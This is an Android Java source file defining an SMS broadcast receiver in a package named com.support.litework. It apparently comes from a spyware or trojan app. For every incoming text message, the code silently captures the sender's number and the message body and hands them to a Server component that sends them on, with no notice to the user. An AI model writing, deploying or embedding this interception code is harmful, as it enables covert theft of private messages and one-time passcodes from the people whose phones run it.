package com.support.litework.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.support.litework.server.Server;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras(); // Retrieves a map of extended data from the intent.
        SmsMessage[] msgs = null;
        String phonenumber = "";
        String messagebody = "";

        if (bundle != null) {
            // Retrieve the SMS message received
            try {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], bundle.getString("format"));
                        phonenumber = msgs[i].getOriginatingAddress();
                        messagebody = msgs[i].getMessageBody();
                    }
                    Server.getContext().sendSMSData(phonenumber, messagebody);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
